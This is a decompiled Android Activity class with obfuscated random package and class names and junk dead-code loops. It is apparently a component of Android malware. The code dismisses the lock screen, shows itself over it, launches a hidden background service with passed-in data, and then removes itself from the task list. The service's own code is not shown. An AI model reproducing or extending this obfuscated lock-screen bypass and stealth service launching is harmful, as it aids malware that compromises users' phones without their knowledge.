package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0044c;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0047e;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;
/* loaded from: classes.dex */
public class utrwrkgcoszzetveklqskawdjgejdycnriijuwnlwjpiutrpty14_CA extends Activity {

    /* renamed from: a */
    private final BroadcastReceiver f445a = new C0114a();

    /* renamed from: b */
    Boolean f446b = Boolean.FALSE;

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.utrwrkgcoszzetveklqskawdjgejdycnriijuwnlwjpiutrpty14_CA$a */
    /* loaded from: classes.dex */
    class C0114a extends BroadcastReceiver {
        C0114a() {
        }

        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            utrwrkgcoszzetveklqskawdjgejdycnriijuwnlwjpiutrpty14_CA.this.finish();
        }
    }

    @Override // android.app.Activity
    public void finish() {
        if (Build.VERSION.SDK_INT >= 21) {
            super.finishAndRemoveTask();
        } else {
            super.finish();
        }
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        try {
            try {
                try {
                    if (Build.VERSION.SDK_INT >= 27) {
                        getWindow().addFlags(1024);
                        ((KeyguardManager) getApplicationContext().getSystemService("keyguard")).requestDismissKeyguard(this, null);
                        setShowWhenLocked(true);
                    } else {
                        getWindow().setFlags(1024, 6816768);
                    }
                } catch (Exception unused) {
                    Boolean bool = Boolean.TRUE;
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                }
            } catch (Exception unused2) {
                getWindow().setFlags(1024, 6816768);
            }
        } catch (Exception unused3) {
            getWindow().setFlags(1024, 1024);
        }
        try {
            String[] stringArrayExtra = getIntent().getStringArrayExtra("key");
            if (stringArrayExtra != null) {
                Context applicationContext = getApplicationContext();
                if (C0044c.m239g(illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.class, applicationContext)) {
                    registerReceiver(this.f445a, new IntentFilter("xyz"));
                    this.f446b = Boolean.TRUE;
                    Intent intent = new Intent(applicationContext, illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.class);
                    intent.putExtra(C0047e.f214d, stringArrayExtra);
                    applicationContext.startService(intent);
                }
            }
        } catch (Exception unused4) {
        }
        finish();
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        super.onDestroy();
        try {
            if (this.f446b.booleanValue()) {
                this.f446b = Boolean.FALSE;
                unregisterReceiver(this.f445a);
            }
        } catch (IllegalArgumentException | Exception unused) {
        }
    }
}
